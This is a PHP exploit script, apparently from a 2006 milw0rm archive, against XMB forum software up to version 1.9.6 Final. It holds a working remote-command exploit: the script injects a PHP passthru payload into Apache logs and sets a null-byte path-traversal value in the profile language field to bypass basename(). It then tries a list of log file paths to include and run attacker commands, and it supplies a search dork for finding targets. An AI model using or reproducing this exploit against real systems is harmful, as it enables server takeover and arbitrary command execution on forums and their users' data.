#!/usr/bin/php -q -d short_open_tag=on
<?
echo "XMB <= 1.9.6 Final basename() 'langfilenew' arbitrary local inclusion / remote commands xctn\n";
echo "by rgod rgod@autistici.org\n";
echo "site: http://retrogod.altervista.org\n";
echo "dork: \"Powered by XMB\"\n\n";

/*
works regardless of php.ini settings
*/

if ($argc<6) {
echo "Usage: php ".$argv[0]." host path username password cmd OPTIONS\n";
echo "host:      target server (ip/hostname)\n";
echo "path:      path to XMB \n";
echo "user/pass: you need a valid user account\n";
echo "cmd:       a shell command\n";
echo "Options:\n";
echo "   -p[port]:   Specify   a port other than 80\n";
echo "   -P[ip:port]:    \"   a proxy\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." localhost /xmb/ user pass ls -la\n";
echo "php ".$argv[0]." localhost /xmb/Files/ user pass ls -la\n";
die;
}

/*
software site: http://www.xmbforum.com/

vulnerable code in  memcp.php at lines 331-333:

...
 if ( !file_exists(ROOT.'/lang/'.basename($langfilenew).'.lang.php') ) {
            $langfilenew = $SETTINGS['langfile'];
        }
...

this check, when you update your profile and select a new language, can be
bypassed by supplying a well crafted value for langfilenew argument, ex:

../../../../../../../apache/logs/access.log[null char]/English

basename() returns 'English' and English.lang.php is an existing file in lang/
folder, now

../../../../../../../apache/logs/access.log[null char]

string is stored in xmb_members table so, every time you are logged in,
u can include an arbitrary file from
local resources because in header.php we have this line

require ROOT."lang/$langfile.lang.php";

and this works regardless of php.ini settings because of the ending null char
stored in database

this tool injects some code in Apache log files and tries to launch commands
*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$user=urlencode($argv[3]);
$pass=urlencode($argv[4]);
$cmd="";
$port=80;
$proxy="";
for ($i=5; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$CODE ='<?php if (get_magic_quotes_gpc()){$_COOKIE[cmd]=stripslashes($_COOKIE[cmd]);}echo my_delim;set_time_limit(0);passthru($_COOKIE[cmd]);echo my_delim;die;?>';
$packet="GET ".$p.$CODE." HTTP/1.1\r\n";
$packet.="User-Agent: ".$CODE."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: close\r\n\r\n";
sendpacketii($packet);

$data ="username=".$user;
$data.="&password=".$pass;
$data.="&hide=1";
$data.="&secure=yes";
$data.="&loginsubmit=Login";
$packet ="POST ".$p."misc.php?action=login HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
$temp=explode("Set-Cookie: ",$html);
$cookie="";
for ($i=1; $i<count($temp); $i++)
{
  $temp2=explode(" ",$temp[$i]);
  $temp3=explode("\r",$temp2[0]);
  if (!strstr($temp3[0],";")){$temp3[0]=$temp3[0].";";}
  $cookie.=" ".$temp3[0];
}
if (($cookie=='') | (!strstr($cookie,"xmbuser")) | (!strstr($cookie,"xmbpw"))){echo "Unable to login...";die;}
else {echo "cookie ->".$cookie."\r\n";}

//fill with possible locations...
$paths= array (
"../../../../../var/log/httpd/access_log",
"../../../../../var/log/httpd/error_log",
"../apache/logs/error.log",
"../apache/logs/access.log",
"../../apache/logs/error.log",
"../../apache/logs/access.log",
"../../../apache/logs/error.log",
"../../../apache/logs/access.log",
"../../../../apache/logs/error.log",
"../../../../apache/logs/access.log",
"../../../../../apache/logs/error.log",
"../../../../../apache/logs/access.log",
"../logs/error.log",
"../logs/access.log",
"../../logs/error.log",
"../../logs/access.log",
"../../../logs/error.log",
"../../../logs/access.log",
"../../../../logs/error.log",
"../../../../logs/access.log",
"../../../../../logs/error.log",
"../../../../../logs/access.log",
"../../../../../etc/httpd/logs/access_log",
"../../../../../etc/httpd/logs/access.log",
"../../../../../etc/httpd/logs/error_log",
"../../../../../etc/httpd/logs/error.log",
"../../../../../var/www/logs/access_log",
"../../../../../var/www/logs/access.log",
"../../../../../usr/local/apache/logs/access_log",
"../../../../../usr/local/apache/logs/access.log",
"../../../../../var/log/apache/access_log",
"../../../../../var/log/apache/access.log",
"../../../../../var/log/access_log",
"../../../../../var/www/logs/error_log",
"../../../../../var/www/logs/error.log",
"../../../../../usr/local/apache/logs/error_log",
"../../../../../usr/local/apache/logs/error.log",
"../../../../../var/log/apache/error_log",
"../../../../../var/log/apache/error.log",
"../../../../../var/log/access_log",
"../../../../../var/log/error_log"
);

for ($i=0; $i<count($paths); $i++)
{
if (strlen($paths[$i])<40) //langfile is varchar(40)...
{
$xpl=$paths[$i];
echo "trying with: ".$paths[$i]."\r\n";
$xpl=urlencode($xpl);
$data.="newpassword=";
$data.="&newpasswordcf=";
$data.="&newemail=".urlencode("suntzu@suntzu.org");
$data.="&newsite=";
$data.="&newwebcam=";
$data.="&newaim=";
$data.="&newicq=";
$data.="&newyahoo=";
$data.="&newmsn=";
$data.="&newmemlocation=";
$data.="&newmood=";
$data.="&newavatar=";
$data.="&newbio=";
$data.="&newsig=";
$data.="&thememem=0";//default theme
$data.="&langfilenew=".$xpl."%00/English"; // basename() circumvention, langfile column: varchar(40)
$data.="&month=0";
$data.="&day=";
$data.="&year=";
$data.="&tppnew=30";
$data.="&pppnew=25";
$data.="&newshowemail=no";
$data.="&newinv=1";
$data.="&newnewsletter=no";
$data.="&useoldu2u=no";
$data.="&saveogu2u=no";
$data.="&emailonu2u=no";
$data.="&timeformatnew=24";
$data.="&dateformatnew=dd-mm-yyyy";
$data.="&timeoffset1=0";
$data.="&editsubmit=Edit%20Profile";
$packet ="POST ".$p."memcp.php?action=profile HTTP/1.0\r\n";
$packet.="Referer: http://".$host.$path."member.php\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Cookie: ".$cookie."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n\r\n";
$packet.=$data;
sendpacketii($packet);

$packet ="GET ".$p."index.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cookie: ".$cookie." cmd=".$cmd.";\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"my_delim"))
{
echo "exploit succeeded...\n";
$temp=explode("my_delim",$html);
die($temp[1]);
}
}
}
//if you are here...
echo "exploit failed...";
?>

# milw0rm.com [2006-08-13]
